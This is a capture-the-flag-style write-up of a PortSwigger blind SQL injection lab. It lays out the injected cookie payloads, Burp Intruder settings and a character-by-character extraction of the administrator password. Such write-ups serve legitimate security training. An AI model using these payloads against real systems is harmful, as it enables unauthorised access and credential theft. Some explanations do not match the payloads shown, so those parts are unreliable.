## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/59fe059e72b0ee170a3c211c9f8fa80bf9aca500/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20responses/Images/Lab%20Description.png)

## Solution :

Request looks like 

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/451a8fdbb5181707a36b451e69fa86ee4e19acbc/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20responses/Images/Cookie%20Session%20Tracking%20on%20BurpSuite.png)

Query made looks something like -

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```
where trackingID - `L0mee8EnmldnnG7p` Cookievalue - `f5CKma0wVFN6Dr66lifBzNMizSM1wv1I`

TrackingID parameter is vulnerable. This is a blind SQL injection since response is not diplayed back. 

We can perform a SQL  injection on trackingID parameter , 

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=1-- '
```

there maybe 2 results - TrackinID does/does not exist.

- Condition(1=1) = **TRUE** -> **Welcome back message is shown**

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=1-- '
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/1e246052772ff3c9653e483837f37f5888f9940b/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20responses/Images/True%20Condition.png)


- Condition(1=2) = **FALSE** -> **Welcome back message is not shown**

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=2-- '
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/b1daa365371f134a178ffe6cf696e5905696fa48/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20responses/Images/False%20Condition.png)


From the above responses, we can we can exploit the blind injection vulnerablitiy .

#### Conform that there is users table -

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'x' FROM users LIMIT 1) = 'x' --
```

```
This SQL statement is checking whether the result of a subquery, which selects the string 'x' from the users table with a limit of 1, is equal to the string 'x'. The use of the AND operator indicates that this condition must be true for the overall query to return any results

If users table  is there, then the condition return x . It checks if returned 'x' = 'x'. Now condition is TRUE. So it conforms that users table is present.
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/a09a494ae654652acf792d0b0adb56139a8a104b/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20responses/Images/Confirm%20User%20Table.png)

We see a *Welcome back* msg , so it conforms that there is a users table.

#### Conform that username administrator is present in users table -

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/7eb765e2caeb0ab2e8d4474ef3b436c51beebaa4/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20responses/Images/Check%20for%20Administrator%20User.png)

We confirm that there is a user called `administrator` in the database.

#### Find the length password of administrator 

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

In particular, the subquery `(SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)` is attempting to retrieve the username of the administrator account whose password is longer than one character. If such an account exists in the database, the subquery will return the value "administrator".

The outer part of the string `AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'` is then attempting to compare this value to the string literal 'administrator'. If the subquery returns the value 'administrator', then the entire expression will evaluate to true.

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/cb93f89bfb36efcb40b41f3a4975c4a8ba27d247/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20responses/Images/Check%20for%20password%20length%20greater%20than%201.png)

This confirms that the password is greater than 1

If we send the value as 1 ie `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=1)='a`  , we dont get any welcome message which means its more than 1  characters.

![image]()

Automate this -> 

1. Send request to Intruder
2. Add the password length part [> 1] 
3. Attack type - SNIPER
4. Payload type - Numbers
5. Give number range from 1-50

There is a difference in length at number 20, means that while checking `if length(password) > 20` it FAILS.

So the total **length of password is 20**.

#### Bruteforce the 20 character length password


Use the same query as above bu thios time we use the  **SUBSTRING** method `(SELECT SUBSTRING(password,1,1)` to get each letter of the password and loop through it  to check if 1st letter is =a/b/c ... & so on.

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' AND LENGTH(password)>1 )='a'--
```
From the above command we take the 1st character of the password & check if it is = 'a'.
Check until the condition returns TRUE. Meaning the first character of password = letter/number at the right.

Automate this  -

1. Attack type - Cluster bomb
2. Payload 1 - length checking part [>1]
3. Payload 2 - character checking part ['a'--]
4. Payload 1 type - Numbers [range 1-20]
5. Payload 2 type - Bruteforcer [min & max length = 1]

Step 1: Attack type - Cluster bomb
![image]()
Step 2: Payload 1 - length checking part [>1]
![image]()
Step 3: Payload 2 - character checking part ['a'--]
![image]()

Step 4: Payload 1 type - Numbers [range 1-20]
![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/3b169b2a92ae096c7ded7787492b55323880bdfb/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20responses/Images/Payload%201%20type.png)

Step 5: Payload 2 type - Bruteforcer [min & max length = 1]
![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/261c6b800f0a92fd012c9734dfc9091ce29b370c/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20responses/Images/Payload%202%20type.png)

In the filter settings, add the search item as `Welcome`

Now we get 20 differnt payloads which give us the **Welcome back** option.

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/7a83791c64b3b4bbdeed0f27dd97f5242ee9e522/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20responses/Images/Payload%20Result%20-%20Password.png)

Arrange the payload number and write the payload2 alphabets (password characters) in order .

So the password is - `b9q9ay14sdg2b1tkpgk9`


![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/31bf0c4dd6b075cda32ac8aff48f9e21b0c42bce/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20responses/Images/Lab%20Solution.png)


